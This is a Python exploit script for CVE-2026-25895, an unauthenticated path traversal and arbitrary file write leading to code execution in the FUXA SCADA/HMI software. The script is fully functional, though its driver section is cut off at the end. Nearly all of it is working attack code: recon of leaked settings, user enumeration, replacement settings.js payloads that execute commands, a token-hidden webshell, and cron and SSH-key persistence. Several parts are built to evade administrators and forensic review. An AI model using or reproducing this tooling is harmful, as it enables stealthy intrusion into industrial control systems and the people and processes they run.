# Exploit Title: CVE-2026-25895 - FUXA Unauthenticated Path Traversal -> Arbitrary File Write -> RCE
# Date: 4/24/2026
# Exploit Author: Anthony Cihan (Hann1bl3L3ct3r)
# Vendor Homepage: https://github.com/frangoteam/FUXA
# Version: <= 1.2.9 
# Tested on: Ubuntu Server 
# CVE : CVE-2026-25895

"""
CVE-2026-25895 - FUXA Unauthenticated Path Traversal -> Arbitrary File Write -> RCE
Affected: FUXA <= 1.2.9
Patched:  1.2.10

Vulnerable endpoint: POST /api/upload (server/api/projects/index.js, ~line 193)
Root cause:
  * The /api/upload route is registered with NO middleware:
        prjApp.post('/api/upload', function (req, res) { ... })
    so it bypasses both `secureFnc` (JWT/API-key) and the admin permission
    gate that wraps every other endpoint in projects/index.js.
  * Inside the handler, the JSON-body field `destination` is concatenated
    into a path with only a leading underscore and no normalization /
    containment check:
        let destinationDir = path.resolve(runtime.settings.appDir,
                                          `_${destination}`);
        filePath = path.join(destinationDir, fullPath || fileName);
        fs.writeFileSync(filePath, basedata, encoding);
    A relative payload of the form `a/../../../../<target>` makes
    Node's path.resolve() climb out of `appDir` to anywhere the FUXA
    process can write.
  * `fullPath`/`fileName` strip `..` sequences, so we control the directory
    via `destination` and the filename via `file.name`.

Exploitation: pre-auth RCE even when `secureEnabled = true`.

Authorization: this script is for credentialed penetration tests against
systems you are explicitly authorized to assess. Use only inside a defined
engagement scope.
"""

from __future__ import annotations

import argparse
import base64
import json
import posixpath
import secrets
import sys
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, quote

try:
    import requests
except ImportError:
    sys.stderr.write("[-] Missing dependency: pip install requests\n")
    sys.exit(2)


BANNER = r"""
  ______ _    ___   __          _______          ___   _
 |  ____| |  | \ \ / /    /\   |  __ \ \        / / \ | |
 | |__  | |  | |\ V /    /  \  | |__) \ \  /\  / /|  \| |
 |  __| | |  | | > <    / /\ \ |  ___/ \ \/  \/ / | . ` |
 | |    | |__| |/ . \  / ____ \| |      \  /\  /  | |\  |
 |_|     \____//_/ \_\/_/    \_\_|       \/  \/   |_| \_|

   CVE-2026-25895 :: FUXA <=1.2.9 Unauth Path Traversal -> RCE
"""


# --- Server response helpers ---------------------------------------------------

def _extract_errno(response_text: str) -> Optional[str]:
    """Parse the server's error JSON body (e.g. {"error":"EACCES","message":
    "EACCES: permission denied, open '/root/x'"}) and return the errno code.
    Returns None if the body is not JSON or has no 'error' key.
    """
    if not response_text:
        return None
    try:
        data = json.loads(response_text)
    except (ValueError, TypeError):
        return None
    if isinstance(data, dict):
        err = data.get("error")
        if isinstance(err, str):
            return err
    return None


def _extract_syscall(response_text: str) -> Optional[str]:
    """Parse the server's error JSON body and return the Node.js syscall that
    failed (e.g. 'open', 'mkdir', 'write'). The upload handler forwards
    `err.message`, which for POSIX fs errors is formatted by libuv as:
        "<CODE>: <reason>, <syscall> '<path>'"
    So we pull the token between the comma and the quoted path.

    The syscall lets us distinguish ambiguous errno values. In particular, on
    EACCES the upload handler conditionally calls fs.mkdirSync(parent,
    {recursive: true}) before writing — so a non-existent /home/<user>/ gets
    mkdir-EACCES (can't create under root-owned /home/), while an existing
    /home/<other>/ (mode 0700) gets open-EACCES on the write itself. Same
    errno, different meaning.
    """
    if not response_text:
        return None
    try:
        data = json.loads(response_text)
    except (ValueError, TypeError):
        return None
    if not isinstance(data, dict):
        return None
    msg = data.get("message")
    if not isinstance(msg, str):
        return None
    # Format: "EACCES: permission denied, mkdir '/home/tony'"
    #                                      ^^^^^
    try:
        tail = msg.split(",", 1)[1].strip()   # "mkdir '/home/tony'"
        syscall = tail.split(" ", 1)[0].strip()
        if syscall and syscall.isalpha():
            return syscall.lower()
    except (IndexError, AttributeError):
        pass
    return None


# --- Low-level upload primitive ------------------------------------------------

class FuxaUploadExploit:
    """Wraps the vulnerable POST /api/upload endpoint."""

    def __init__(self, base_url: str, timeout: int = 15, verify_tls: bool = True,
                 proxy: Optional[str] = None, verbose: bool = True):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (FUXA-CVE-2026-25895-PoC)",
            "Content-Type": "application/json",
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    # ---- helpers --------------------------------------------------------------

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def fingerprint(self) -> Tuple[bool, str]:
        """GET /api/version returns FUXA's own version string ('1.0.0' for the
        api wrapper) — used as a pre-flight reachability check.
        """
        url = urljoin(self.base_url + "/", "api/version")
        try:
            r = self.session.get(url, timeout=self.timeout, verify=self.verify_tls)
        except requests.RequestException as e:
            return False, f"connection error: {e}"
        if r.status_code != 200:
            return False, f"unexpected status {r.status_code}"
        return True, r.text.strip()

    def fetch_settings(self) -> Tuple[bool, str, Optional[Dict]]:
        """GET /api/settings returns the full `runtime.settings` object
        (minus smtp password / secretCode) with NO auth middleware in FUXA
        <=1.2.9. Primary pre-auth information leak used by --mode recon.
        """
        url = urljoin(self.base_url + "/", "api/settings")
        try:
            r = self.session.get(url, timeout=self.timeout, verify=self.verify_tls)
        except requests.RequestException as e:
            return False, f"connection error: {e}", None
        if r.status_code != 200:
            return False, f"unexpected status {r.status_code}", None
        try:
            return True, "ok", r.json()
        except ValueError:
            return False, f"non-JSON response (first 200B): {r.text[:200]!r}", None

    # ---- core exploit ---------------------------------------------------------

    def upload(self, destination: str, filename: str, content: bytes,
               file_type: str = "bin") -> requests.Response:
        """Send the crafted upload that triggers the path-traversal write.

        Server-side decoding rules (from server/api/projects/index.js):
          * if file.type === 'svg'  -> raw write of file.data (no decoding)
          * otherwise               -> file.data is treated as base64 and
                                       written via fs.writeFileSync(..., 'base64')
        We use base64 by default so we can deliver arbitrary binary content.
        """
        if file_type == "svg":
            # Raw text passthrough; keep file.type = 'svg' so the server
            # writes it without base64 decoding.
            data_field = content.decode("utf-8", errors="replace")
        else:
            data_field = base64.b64encode(content).decode("ascii")

        body = {
            "resource": {
                "name": filename,
                "fullPath": filename,   # written into the destination dir verbatim
                "type": file_type,
                "data": data_field,
            },
            "destination": destination,
        }

        url = urljoin(self.base_url + "/", "api/upload")
        return self.session.post(url, data=json.dumps(body),
                                 timeout=self.timeout, verify=self.verify_tls)

    def write_arbitrary(self, target_abs_path: str, content: bytes,
                        appdir_depth: int = 10, file_type: str = "bin") -> dict:
        """High-level: write `content` to any absolute path the FUXA process
        can reach.

        We assume FUXA's `runtime.settings.appDir` is the `server/` directory
        of the install. To climb out of it we prepend a dummy segment + N
        `..` jumps. `appdir_depth` is intentionally generous; extra `..`
        components past the filesystem root are no-ops on POSIX.
        """
        # Use posixpath unconditionally — the target is a Linux server, so we
        # cannot let the host's os.path module rewrite separators on Windows.
        target_abs_path = posixpath.normpath(target_abs_path.replace("\\", "/"))
        if not target_abs_path.startswith("/"):
            raise ValueError("target_abs_path must be absolute (POSIX)")

        target_dir, target_name = posixpath.split(target_abs_path)
        # destination becomes:  a/..//..//..//..//..//..//..//..  + target_dir
        # path.resolve(appDir, '_a/..//..//.../target_dir') -> target_dir
        # The leading 'a' is a throw-away segment that absorbs the '_' prefix.
        traversal = "a" + ("/.." * appdir_depth)
        destination = traversal + target_dir   # target_dir starts with '/'

        resp = self.upload(destination=destination, filename=target_name,
                           content=content, file_type=file_type)

        ok = resp.status_code == 200
        return {
            "status_code": resp.status_code,
            "response_text": resp.text[:400],
            "errno": _extract_errno(resp.text),
            "syscall": _extract_syscall(resp.text),
            "target": target_abs_path,
            "wrote_bytes": len(content),
            "success": ok,
        }


# --- High-level payloads -------------------------------------------------------

def payload_proof(host: str) -> bytes:
    """Default canary payload. Deliberately bland — no CVE ID, no vendor
    name, no tool signature — so that the file sitting on the target's
    filesystem is not a glaring IOC for log-scraping defenders or DFIR.
    Operators who want an explicit PoC demo payload should use
    --canary-content to supply their own file.
    """
    _ = host  # retained for API compatibility; intentionally unused
    return b"healthcheck ok\n"


def payload_settings_js_rce(callback_cmd: str,
                            real_settings: Optional[Dict] = None) -> bytes:
    """A drop-in replacement for FUXA's _appdata/settings.js.

    The file is loaded via require() in main.js at every startup, so any JS
    placed at module top-level executes inside the FUXA Node process the
    next time FUXA initializes. Passing `real_settings` (the dict returned
    by GET /api/settings) preserves the target's actual configuration —
    uiPort, allowedOrigins, secureEnabled, custom paths — so admins don't
    notice config drift after restart.
    """
    # NB: the callback_cmd is interpolated as a JS string. Escape backslashes
    # and single-quotes so it survives JS parsing. Single-quoted JS string.
    safe = callback_cmd.replace("\\", "\\\\").replace("'", "\\'")
    return (
        "// CVE-2026-25895 PoC — replacement settings.js (command payload)\n"
        "try {\n"
        "    require('child_process').exec('" + safe + "',\n"
        "        { detached: true, stdio: 'ignore' });\n"
        "} catch (e) { /* swallow so FUXA still boots */ }\n"
        "\n"
        + _settings_module_exports(real_settings)
    ).encode("utf-8")


def payload_authorized_keys(pubkey: str) -> bytes:
    return (pubkey.rstrip("\n") + "\n").encode("utf-8")


# --- Webshell payload ----------------------------------------------------------
#
# The canonical Node-on-target webshell: a replacement settings.js module
# that, at module-load time, spawns an HTTP listener inside the FUXA process.
# The listener exposes a single authenticated endpoint that runs commands via
# child_process.exec and returns stdout/stderr in the HTTP response body.
#
# Design notes:
#  * Bind on 0.0.0.0:<ws_port> (configurable). Different port from FUXA's
#    main 1881 so we don't collide with the app's own Express server.
#  * Auth: required token via `X-Auth-Token` header OR `?t=<token>` query.
#    Wrong / missing token -> 404 (indistinguishable from a non-existent
#    endpoint) to make the listener invisible to dumb scanners.
#  * Path: configurable random secret path (default: 24 random hex chars).
#    Requests to any other path also get 404.
#  * Error isolation: server.on('error', ...) swallows EADDRINUSE and
#    friends so a restart cycle that can't rebind the port does NOT take
#    FUXA down. Try/catch wraps the whole initialization for the same
#    reason — the settings.js load path MUST NOT throw, or FUXA will
#    fail to boot.
#  * The module still exports the full settings object verbatim so FUXA
#    boots cleanly and operators see a healthy service.

def payload_webshell_js(ws_port: int, ws_path: str, ws_token: str,
                        real_settings: Optional[Dict] = None) -> bytes:
    """Replacement settings.js that, on FUXA startup, binds an authenticated
    HTTP command-execution endpoint inside the Node process.

    Passing `real_settings` (from GET /api/settings) preserves the target's
    actual configuration in the module.exports block so the service looks
    unchanged to admins after restart.
    """
    # All three operator inputs are interpolated into a JS string literal.
    # Escape backslashes + single quotes so nothing breaks out.
    def esc(s: str) -> str:
        return s.replace("\\", "\\\\").replace("'", "\\'")

    path_js = esc(ws_path if ws_path.startswith("/") else "/" + ws_path)
    token_js = esc(ws_token)

    return (
        "// CVE-2026-25895 PoC — replacement settings.js (HTTP webshell)\n"
        "try {\n"
        "    const http = require('http');\n"
        "    const { exec } = require('child_process');\n"
        "    const urlMod = require('url');\n"
        "    const WS_PORT  = " + str(int(ws_port)) + ";\n"
        "    const WS_PATH  = '" + path_js + "';\n"
        "    const WS_TOKEN = '" + token_js + "';\n"
        "    const server = http.createServer((req, res) => {\n"
        "        try {\n"
        "            const parsed = urlMod.parse(req.url || '', true);\n"
        "            const hdrTok = req.headers['x-auth-token'];\n"
        "            const qTok = parsed.query && parsed.query.t;\n"
        "            const tok = (typeof hdrTok === 'string') ? hdrTok : qTok;\n"
        "            if (parsed.pathname !== WS_PATH || tok !== WS_TOKEN) {\n"
        "                res.writeHead(404, {'Content-Type': 'text/plain'});\n"
        "                res.end('Not Found');\n"
        "                return;\n"
        "            }\n"
        "            const handle = (cmd) => {\n"
        "                if (!cmd) {\n"
        "                    res.writeHead(400, {'Content-Type': 'text/plain'});\n"
        "                    res.end('missing cmd');\n"
        "                    return;\n"
        "                }\n"
        "                exec(cmd, { timeout: 60000, maxBuffer: 16*1024*1024, shell: '/bin/sh' },\n"
        "                    (err, stdout, stderr) => {\n"
        "                        let out = '';\n"
        "                        if (stdout) out += stdout.toString();\n"
        "                        if (stderr) out += stderr.toString();\n"
        "                        if (err && typeof err.code !== 'undefined' && err.code !== 0) {\n"
        "                            out += '\\n[exit ' + err.code + ']';\n"
        "                        }\n"
        "                        res.writeHead(200, {'Content-Type': 'text/plain; charset=utf-8'});\n"
        "                        res.end(out);\n"
        "                    });\n"
        "            };\n"
        "            if (req.method === 'POST') {\n"
        "                let body = '';\n"
        "                req.on('data', (c) => { body += c; if (body.length > 65536) req.destroy(); });\n"
        "                req.on('end', () => {\n"
        "                    let cmd = parsed.query.cmd;\n"
        "                    if (!cmd && body) {\n"
        "                        try {\n"
        "                            const j = JSON.parse(body);\n"
        "                            cmd = j.cmd;\n"
        "                        } catch (e) { cmd = body; }\n"
        "                    }\n"
        "                    handle(cmd);\n"
        "                });\n"
        "                req.on('error', () => { try { res.end(); } catch (e) {} });\n"
        "            } else {\n"
        "                handle(parsed.query.cmd);\n"
        "            }\n"
        "        } catch (e) {\n"
        "            try { res.writeHead(500); res.end('err'); } catch (ee) {}\n"
        "        }\n"
        "    });\n"
        "    server.on('error', () => { /* swallow bind errors */ });\n"
        "    server.listen(WS_PORT, '0.0.0.0');\n"
        "} catch (e) { /* swallow so FUXA still boots */ }\n"
        "\n"
        + _settings_module_exports(real_settings)
    ).encode("utf-8")


def _settings_module_exports(real_settings: Optional[Dict] = None) -> str:
    """Return JS source for `module.exports = {...}`.

    When `real_settings` is provided (fetched from GET /api/settings), emit
    it as a JSON literal — JSON is a valid JavaScript expression when used
    as an object literal, and this preserves the target's real uiPort,
    allowedOrigins, secureEnabled, custom paths, etc. so admins don't spot
    config drift after restart.

    Caveats (see server/api/index.js:103-110):
      * `/api/settings` DELETES `secretCode` from its response, and
        `smtp.password` if smtp is set. Our replacement settings.js will not
        contain them. jwt-helper.js:6 falls back to 'frangoteam751' when
        secretCode is missing, which invalidates any existing JWTs issued
        under a previously-customized secretCode. The default install has
        secretCode commented out (settings.default.js:94), so most targets
        are unaffected — but when `secureEnabled: true`, warn the operator.
      * process.env.PORT resolution is lost (we only see the runtime value).
        In practice FUXA installs rarely rely on PORT env dynamism.

    When `real_settings` is None, fall back to a minimal config that matches
    settings.default.js so FUXA still boots. Use this only when the recon
    fetch failed — prefer the real-settings path.
    """
    if real_settings is not None:
        body = json.dumps(real_settings, indent=4, ensure_ascii=False,
                          sort_keys=False, default=str)
        return "module.exports = " + body + ";\n"
    # Fallback — minimal config derived from FUXA 1.2.9 settings.default.js.
    return (
        "module.exports = {\n"
        "    version: 1.4,\n"
        "    language: 'en',\n"
        "    uiPort: process.env.PORT || 1881,\n"
        "    logDir: '_logs',\n"
        "    logApiLevel: 'tiny',\n"
        "    dbDir: '_db',\n"
        "    daqEnabled: true,\n"
        "    daqTokenizer: 24,\n"
        "    logs: { retention: 'none' },\n"
        "    broadcastAll: false,\n"
        "    allowedOrigins: ['http://localhost', 'http://127.0.0.1',\n"
        "                     'http://192.168.*', 'http://10.*',\n"
        "                     'http://localhost:4200'],\n"
        "    heartbeatIntervalSec: 10,\n"
        "    webcamSnapShotsDir: '_webcam_snapshots',\n"
        "    webcamSnapShotsCleanup: false,\n"
        "    webcamSnapShotsRetain: 7,\n"
        "    swaggerEnabled: false,\n"
        "    nodeRedEnabled: false,\n"
        "};\n"
    )


# --- Cron payload --------------------------------------------------------------
#
# The write primitive can drop directly into cron-reread paths. When FUXA
# runs as root (common in container deployments, and in any install where
# the service was started by an admin who didn't bother with a dedicated
# user), /etc/cron.d/<name> is re-read every minute by the cron daemon —
# that's RCE with a <=60s delay and no FUXA restart.
#
# When FUXA runs as a non-root user, /var/spool/cron/crontabs/<user>
# (Debian/Vixie layout) or /var/spool/cron/<user> (RHEL/cronie) is the
# equivalent, but those user-crontab paths require mode 0600 and the
# correct owning uid; fs.writeFileSync will produce mode 0644 owned by
# the FUXA uid, which matches the owner but not the mode — Vixie rejects,
# cronie accepts. Test per engagement.

_CRON_HEADER = (
    "# FUXA health monitor\n"
    "SHELL=/bin/sh\n"
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
)


def payload_cron_job(schedule: str, user: Optional[str], cmd: str) -> bytes:
    """Build a cron file body.

    If `user` is given (required for /etc/cron.d/* and /etc/crontab), the
    user field is included. For /var/spool/cron/crontabs/<user> style files,
    pass user=None so only `schedule cmd` is written.
    """
    if user:
        line = f"{schedule} {user} {cmd}\n"
    else:
        line = f"{schedule} {cmd}\n"
    return (_CRON_HEADER + line).encode("utf-8")


# --- Webshell client -----------------------------------------------------------
#
# Convenience: after writing the webshell payload, the operator can exec
# commands through it directly from this script instead of reaching for curl.

class FuxaWebshellClient:
    """Thin HTTP client for the webshell listener embedded in settings.js."""

    def __init__(self, host: str, port: int, ws_path: str, ws_token: str,
                 timeout: int = 65, use_tls: bool = False,
                 verify_tls: bool = True, proxy: Optional[str] = None):
        if not ws_path.startswith("/"):
            ws_path = "/" + ws_path
        scheme = "https" if use_tls else "http"
        self.url = f"{scheme}://{host}:{port}{ws_path}"
        self.token = ws_token
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (FUXA-CVE-2026-25895-Shell)",
            "X-Auth-Token": ws_token,
            "Content-Type": "application/json",
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def exec(self, cmd: str) -> Tuple[int, str]:
        try:
            r = self.session.post(
                self.url,
                data=json.dumps({"cmd": cmd}),
                timeout=self.timeout,
                verify=self.verify_tls,
            )
            return r.status_code, r.text
        except requests.RequestException as e:
            return 0, f"[client] request failed: {e}"

    def alive(self) -> Tuple[bool, str]:
        """Cheap liveness check — the listener is up if `echo ok` returns."""
        code, body = self.exec("echo ok")
        return (code == 200 and "ok" in body), f"HTTP {code}: {body.strip()[:120]}"


def _interactive_loop(client: "FuxaWebshellClient") -> None:
    print("[*] Webshell client — type commands, :q to exit, :help for tips",
          flush=True)
    ok, info = client.alive()
    if ok:
        print(f"[+] Listener reachable ({info})", flush=True)
    else:
        print(f"[!] Listener not responding yet ({info}). FUXA may not have "
              "restarted since the webshell payload was written — wait for "
              "the next cold start, then retry.", flush=True)
    try:
        while True:
            try:
                line = input("fuxa$ ")
            except EOFError:
                print()
                break
            if not line.strip():
                continue
            if line.strip() in (":q", ":quit", ":exit"):
                break
            if line.strip() == ":help":
                print("  :q          - quit\n"
                      "  :alive      - ping the listener\n"
                      "  any other   - run via /bin/sh on the target",
                      flush=True)
                continue
            if line.strip() == ":alive":
                ok, info = client.alive()
                print(f"    {'[+]' if ok else '[-]'} {info}", flush=True)
                continue
            code, body = client.exec(line)
            if code != 200:
                print(f"[!] HTTP {code}", flush=True)
            sys.stdout.write(body)
            if body and not body.endswith("\n"):
                sys.stdout.write("\n")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[*] Interrupted.", flush=True)


# --- Recon helpers -------------------------------------------------------------
#
# `/api/settings` is registered WITHOUT auth middleware in server/api/index.js
# at line 103, so an unauthenticated GET returns the full `runtime.settings`
# object (smtp password + secretCode redacted). The absolute paths in that
# object reveal the FUXA cwd and, by inference, the OS user the process runs
# under. This is the primary recon primitive.

# Path-prefix patterns that map to a likely running user or deployment context.
USER_CONTEXT_HINTS: List[Tuple[str, str, Optional[str]]] = [
    # (prefix,           human-readable context,                       inferred user)
    ("/root/",           "paths under /root/",                         "root"),
    ("/usr/src/app/",    "upstream FUXA Dockerfile WORKDIR",           "root (in container)"),
    ("/opt/fuxa/",       "/opt packaged install",                      "fuxa (typical service user)"),
    ("/opt/FUXA/",       "/opt packaged install (uppercase layout)",   "fuxa / root"),
    ("/srv/fuxa/",       "/srv packaged install",                      "fuxa (typical service user)"),
    ("/var/lib/fuxa/",   "systemd dedicated-user install",             "fuxa"),
    ("/app/",            "Docker container (custom image)",            "root (likely)"),
    ("/tmp/",            "non-standard / dev/test deployment",         None),
]

# Paths whose fields are worth printing in a recon summary.
_RECON_KEYS_INTERESTING: List[str] = [
    "version", "uiHost", "uiPort", "serverPort", "language",
    "environment", "secureEnabled", "nodeRedEnabled", "swaggerEnabled",
    "appDir", "workDir", "logDir", "dbDir",
    "uploadFileDir", "imagesFileDir", "widgetsFileDir",
    "reportsDir", "webcamSnapShotsDir", "userSettingsFile",
    "httpStatic", "userDir",
]

# Subset of keys that should hold an absolute path — used for user inference.
_RECON_KEYS_PATHS: List[str] = [
    "appDir", "workDir", "logDir", "dbDir",
    "uploadFileDir", "imagesFileDir", "widgetsFileDir",
    "reportsDir", "webcamSnapShotsDir", "userSettingsFile",
    "httpStatic", "userDir",
]


# Home-directory candidates for active user inference.
#
# Rationale: when the install paths leaked by /api/settings don't reveal the
# running user (e.g. install is under /opt, /tmp, or a generic /app), and the
# /root probe fails (not root), we still need the user's name before we can
# drop ssh keys or write anywhere under /home/<user>/. A 0-byte write to
# /home/<candidate>/.fuxa-probe-<rand> is a strong positive signal: home dirs
# are typically mode 0700 owned by the user, so a successful write implies
# FUXA runs as that user. Failure is ambiguous (no dir OR no perm), so we
# only act on successes.
#
# Keep this list short and high-signal. Each probe leaves a marker file on the
# target, so a 100-entry list also means 100 files to clean up. Operators with
# a known-user shortlist should pass --home-wordlist.

DEFAULT_HOME_CANDIDATES: List[str] = [
    # Service / role accounts common on SCADA / OT boxes
    "fuxa", "scada", "operator", "opc", "plc", "hmi",
    "node", "nodered", "service", "app",
    # Distro / image defaults
    "ubuntu", "debian", "centos", "admin", "pi",
    # Generic
    "user",
]


def _infer_user_from_path(p: str) -> Tuple[str, Optional[str]]:
    """Given one absolute path from settings, return (context, likely_user)."""
    if p.startswith("/home/"):
        # Expect /home/<name>/... — grab the <name> segment.
        parts = p.split("/", 3)   # ['', 'home', '<name>', '<rest>']
        if len(parts) >= 3 and parts[2]:
            return (f"home-directory install under /home/{parts[2]}/", parts[2])
        return ("home-directory install under /home/", None)
    for prefix, label, user in USER_CONTEXT_HINTS:
        if p.startswith(prefix):
            return (label, user)
    return ("unrecognized path layout — inspect manually", None)


def probe_home_directories(ex: "FuxaUploadExploit", depth: int,
                           candidates: List[str]
                           ) -> Tuple[List[str], List[str]]:
    """Iterate /home/<candidate>/ with a 0-byte write probe.

    The upload handler (server/api/projects/index.js) runs
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(filePath, ...);
    so the failing syscall in the server's error message tells us which step
    tripped, and that determines what the filesystem actually looks like:

      * 200 OK                         -> home exists AND FUXA can write
                                          -> likely the running user
      * 400 EACCES, syscall=open/write -> home dir exists but mode-0700 owned
                                          by someone else -> OTHER user exists
      * 400 EACCES, syscall=mkdir      -> home dir does NOT exist; we tried
                                          to create it under root-owned /home/
                                          and got denied -> user absent
      * 400 ENOENT                     -> deep ancestor missing (rare under
                                          recursive mkdir); treat as absent
      * anything else                  -> unexpected; stay silent

    Distinguishing mkdir-EACCES from open-EACCES is critical: without it,
    every candidate in the wordlist reports as "account present" because
    non-root FUXA can't mkdir under /home/ regardless of whether the user
    exists. See the fuxapwn write-up for the observed behaviour.

    Returns (writable_users, other_existing_users). Multiple entries in
    writable_users indicate FUXA is root or group perms are loose; the
    caller decides how to report.
    """
    writable: List[str] = []
    other_exists: List[str] = []
    markers: List[str] = []
    for user in candidates:
        marker = f".fuxa-probe-{secrets.token_hex(4)}"
        target = f"/home/{user}/{marker}"
        res = ex.write_arbitrary(target, b"", appdir_depth=depth,
                                 file_type="svg")
        if res["success"]:
            print(f"    [+] /home/{user}/ is writable (likely user: {user})",
                  flush=True)
            writable.append(user)
            markers.append(target)
            continue
        errno = res.get("errno")
        syscall = res.get("syscall")
        # Only an EACCES on the write itself (open/write/copyfile/etc., i.e.
        # anything that isn't the pre-flight mkdir) proves the home dir
        # exists. A mkdir EACCES just means /home/<user>/ is absent and we
        # can't create it.
        if errno == "EACCES" and syscall and syscall != "mkdir":
            print(f"    [*] /home/{user}/ exists but is not writable "
                  "(EACCES on write) — account present, not the FUXA user",
                  flush=True)
            other_exists.append(user)
        # All other outcomes (EACCES+mkdir, ENOENT, unknown) are treated as
        # "not here" and stay silent — logging each miss drowns the signal.
    if markers:
        print("[*] Probe markers left on target — clean up once you have exec:",
              flush=True)
        for m in markers:
            print(f"       rm {m}", flush=True)
    return writable, other_exists


def do_recon(ex: "FuxaUploadExploit", depth: int,
             probe_root: bool = False, probe_home: bool = False,
             home_candidates: Optional[List[str]] = None) -> int:
    """Run --mode recon: fetch /api/settings (unauth), summarize running
    context, infer likely OS user, and optionally probe /root/ or
    /home/<user>/ writability to pin down the running user when paths
    alone don't leak it.
    """
    print("[*] Stage 1 — GET /api/settings (unauthenticated leak)", flush=True)
    ok, info, settings = ex.fetch_settings()
    if not ok or settings is None:
        print(f"[-] /api/settings fetch failed: {info}", flush=True)
        return 1

    print("[+] /api/settings returned JSON. Interesting fields:", flush=True)
    for k in _RECON_KEYS_INTERESTING:
        if k in settings:
            print(f"    {k:22s} = {settings[k]!r}", flush=True)

    # Path-based user inference.
    print("[*] Stage 2 — user inference from absolute path layout:", flush=True)
    candidates: "set[str]" = set()
    saw_path = False
    for k in _RECON_KEYS_PATHS:
        v = settings.get(k)
        if not isinstance(v, str) or not v.startswith("/"):
            continue
        saw_path = True
        label, user = _infer_user_from_path(v)
        suffix = f" -> likely user: {user}" if user else ""
        print(f"    {k}={v}  [{label}]{suffix}", flush=True)
        if user:
            candidates.add(user)

    if not saw_path:
        print("    (no absolute paths reported — manual inspection required)",
              flush=True)
    elif candidates:
        print(f"[+] Likely running user(s): {', '.join(sorted(candidates))}",
              flush=True)
    else:
        print("[!] Could not infer user from paths alone. Re-run with "
              "--probe-root to confirm root access directly.", flush=True)

    # Node-RED gate — key tell for instant unauth RCE.
    if settings.get("nodeRedEnabled"):
        print("[!] nodeRedEnabled=true — POST /nodered/flows and "
              "/nodered/flows/deploy bypass auth in allowDashboard "
              "(server/integrations/node-red/index.js:134-136). A function "
              "node flow is instant unauth RCE; no FUXA restart required.",
              flush=True)
    else:
        print("[*] nodeRedEnabled=false — Node-RED instant-RCE pivot not "
              "currently available (would require flipping the setting and "
              "a restart).", flush=True)

    # Optional active probe: write a 0-byte marker to /root/.
    root_writable: Optional[bool] = None
    if probe_root:
        marker = f".fuxa-probe-{secrets.token_hex(4)}"
        target = f"/root/{marker}"
        print(f"[*] Stage 3 — probing /root/ writability via {target}",
              flush=True)
        res = ex.write_arbitrary(target, b"", appdir_depth=depth,
                                 file_type="svg")
        if res["success"]:
            root_writable = True
            print(f"[+] /root/{marker} write SUCCEEDED — FUXA is running as "
                  f"root. (Clean up {target} once you have exec.)",
                  flush=True)
        else:
            root_writable = False
            errno = res.get("errno") or "unknown"
            print(f"[-] /root write failed (errno={errno}) — FUXA is NOT "
                  "root.", flush=True)

    # Optional active probe: iterate /home/<user>/ candidates. Most useful
    # when paths didn't leak the user and root probe came back negative
    # (or wasn't run). If root was confirmed writable, we still run the
    # probe if asked but annotate that positives are not conclusive.
    if probe_home:
        candidates = home_candidates if home_candidates else DEFAULT_HOME_CANDIDATES
        stage = "Stage 4" if probe_root else "Stage 3"
        print(f"[*] {stage} — probing /home/<user>/ writability across "
              f"{len(candidates)} candidate(s)", flush=True)
        writable, other_exists = probe_home_directories(ex, depth, candidates)

        if other_exists:
            print(f"[*] Other user accounts confirmed on target (home exists, "
                  f"not the FUXA user): {', '.join(other_exists)}. Useful for "
                  "lateral movement planning.", flush=True)

        if not writable:
            if other_exists:
                print("[-] None of the probed accounts ARE the FUXA user. "
                      "Extend the wordlist via --home-wordlist, or drop a "
                      "webshell/cron payload to enumerate via exec.",
                      flush=True)
            else:
                print("[-] No /home/<user> in the candidate list was writable "
                      "or even present. Target may not use /home/ layout "
                      "(e.g. /var/lib, /opt, containerized). Extend via "
                      "--home-wordlist or pivot to webshell/cron.",
                      flush=True)
        elif root_writable:
            print("[!] /root was writable earlier, so FUXA is root and can "
                  "write to any /home/<user>/. The positives above do NOT "
                  "identify the running user.", flush=True)
        elif len(writable) == 1:
            user = writable[0]
            print(f"[+] Inferred running user: {user}", flush=True)
            print(f"    Suggested follow-up for mode=ssh-key: --home /home/{user}",
                  flush=True)
        else:
            print(f"[!] Multiple /home/<user>/ dirs were writable: "
                  f"{', '.join(writable)}. Unusual (loose group perms, shared "
                  "service account, or root). Confirm via webshell/cron exec.",
                  flush=True)

    return 0


# --- Payload-time helpers ------------------------------------------------------

def _fetch_real_settings_for_payload(ex: "FuxaUploadExploit") -> Optional[Dict]:
    """Fetch /api/settings so our settings.js replacement can preserve the
    target's real config. Returns None on failure (caller falls back to the
    built-in default). Warns on operational gotchas (auth enabled, smtp set)
    that the redaction behavior of /api/settings can't round-trip.
    """
    print("[*] Pre-fetching /api/settings so the replacement preserves the "
          "target's real config...", flush=True)
    ok, info, settings = ex.fetch_settings()
    if not ok or settings is None:
        print(f"[!] /api/settings fetch failed ({info}). Falling back to the "
              "built-in default settings block — custom uiPort, "
              "allowedOrigins, secureEnabled, etc. on the target will be "
              "reset on next restart. Consider aborting if config fidelity "
              "matters for this engagement.", flush=True)
        return None
    # Operational warnings based on what we got back.
    if settings.get("secureEnabled"):
        print("[!] target has secureEnabled=true. /api/settings redacts "
              "secretCode, so the replacement settings.js cannot round-trip "
              "it. FUXA's jwt-helper.js will fall back to the hardcoded "
              "default 'frangoteam751', which invalidates any existing JWTs "
              "if the target previously set a custom secretCode. Users will "
              "be kicked out on next request after restart.", flush=True)
    if isinstance(settings.get("smtp"), dict):
        print("[!] target has smtp configured. /api/settings redacts "
              "smtp.password; replacement settings.js will have no smtp "
              "password. Outgoing mail from FUXA will fail until restored.",
              flush=True)
    print(f"[+] Pulled {len(settings)} settings keys; replacement will mirror "
          "the target.", flush=True)
    return settings


# --- Driver --------------------------------------------------------------------

